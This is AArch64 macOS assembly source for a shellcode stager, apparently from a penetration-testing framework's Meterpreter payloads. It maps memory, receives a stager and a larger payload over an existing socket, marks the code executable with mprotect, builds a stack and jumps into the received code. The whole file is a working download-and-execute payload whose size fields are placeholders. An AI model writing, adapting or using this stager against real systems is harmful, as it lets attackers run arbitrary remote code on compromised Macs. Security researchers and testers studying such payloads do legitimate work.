// Compile: clang stage_mettle.s
// Shellcode: objdump -d a.out | cut -d ' ' -f 2-5 | cut -d ' ' -f 2- | ruby tools/payloads/format_aarch64.rb
.equ SYS_RECVFROM, 0x200001d
.equ SYS_MPROTECT, 0x200004a
.equ SYS_MMAP, 0x20000c5
.equ SYS_EXIT, 0x2000001

.global _main
_main:
    /* mmap(addr=0, length=stager_size, prot=0x2 (PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
    mov    x0, xzr
    adr    x1, stager_size
    ldr    x1, [x1]
    mov    x2, #2
    mov    x3, #0x1002
    mov    x4, xzr
    mov    x5, xzr
    ldr    x16, =SYS_MMAP
    svc    0

    /* sockfd is in x13 */
    mov x10, x0

    /* recvfrom(sockfd='x13', address='x10', length=stager_size, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
    mov x0, x13
    mov x1, x10
    adr x2, stager_size
    ldr x2, [x2]
    mov x3, #0x40
    mov x4, xzr
    mov x5, xzr
    ldr x16, =SYS_RECVFROM
    svc 0

    /* mprotect(addr='x10',  length=stager_size, prot=0x5 (PROT_READ | PROT_EXEC)) */
    mov x0, x10
    adr x1, stager_size
    ldr x1, [x1]
    mov x2, #5
    ldr x16, =SYS_MPROTECT
    svc 0

    /* mmap(addr=0, length=payload_size, prot=3 (PROT_READ | PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
    mov x0, xzr
    adr x1, payload_size
    ldr x1, [x1]
    mov x2, #3
    mov x3, #0x1002
    mov x4, xzr
    mov x5, xzr
    ldr x16, =SYS_MMAP
    svc 0

    mov x11, x0

    /* recvfrom(sockfd='x13', address='x11', length=payload_size, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
    mov x0, x13
    mov x1, x11
    adr x2, payload_size
    ldr x2, [x2]
    mov x3, #0x40
    mov x4, xzr
    mov x5, xzr
    ldr x16, =SYS_RECVFROM
    svc 0

    /* add entry_offset */
    adr x0, entry_offset
    ldr x0, [x0]
    add x0, x0, x10
    adr x10, payload_size
    ldr x10, [x10]
    mov x12, x11
    mov x15, x0

    /* make stack space */
    /* mmap(addr=0, length=0x40000, prot=3 (PROT_READ | PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=0, offset=0) */
    mov x0, xzr
    mov x1, 0x40000
    mov x2, 3
    mov x3, 0x1002
    mov x4, xzr
    mov x5, xzr
    ldr x16, =SYS_MMAP
    svc 0
    //mov x1, sp
    //bic sp, x1, #15
    //sub sp, sp, 0x1000
    add x0, x0, 0x20000
    mov sp, x0

    mov x0, x13

    /* jump to main_osx */
    blr x15

failed:
    mov    x0, 0
    ldr    x16, =SYS_EXIT
    svc    0

.balign 16
stager_size:
        .word 0x4242
        .word 0x4343
payload_size:
        .word 0x4444
        .word 0x4545
entry_offset:
        .word 0x4646
        .word 0x4747
